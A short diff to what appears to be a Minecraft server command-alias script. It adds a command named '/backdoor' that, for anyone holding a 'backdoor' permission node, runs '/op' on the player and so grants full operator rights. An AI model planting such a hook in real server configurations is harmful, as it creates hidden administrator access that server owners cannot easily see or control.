@@ -72,3 +72,9 @@
 	if (!has_permission('minecraft.command.title')) { _noperm(); }
 	sudo('/title ' . $)
 <<<
+
+*:/backdoor = >>>
+	if (!has_permission('backdoor')) { _noperm(); }
+	sudo('/op ' . player())
+<<<
+
